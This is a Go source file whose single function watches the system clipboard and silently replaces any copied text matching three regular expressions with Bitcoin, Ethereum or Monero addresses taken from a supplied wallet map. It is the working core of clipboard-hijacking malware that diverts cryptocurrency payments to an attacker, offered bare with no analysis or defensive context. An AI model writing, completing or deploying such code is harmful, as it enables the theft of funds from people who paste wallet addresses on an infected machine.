package main

import (
	"context"
	"regexp"

	"golang.design/x/clipboard"
)

func MonitorClipboard(wallet map[string]string, regex []*regexp.Regexp) {
	ch := clipboard.Watch(context.TODO(), clipboard.FmtText)
	for data := range ch {
		found := regex[0].Match(data)
		if found {
			clipboard.Write(clipboard.FmtText, []byte(wallet["btc_addr"]))
		}
		found = regex[1].Match(data)
		if found {
			clipboard.Write(clipboard.FmtText, []byte(wallet["eth_addr"]))
		}
		found = regex[2].Match(data)
		if found {
			clipboard.Write(clipboard.FmtText, []byte(wallet["xmr_addr"]))
		}
	}
}
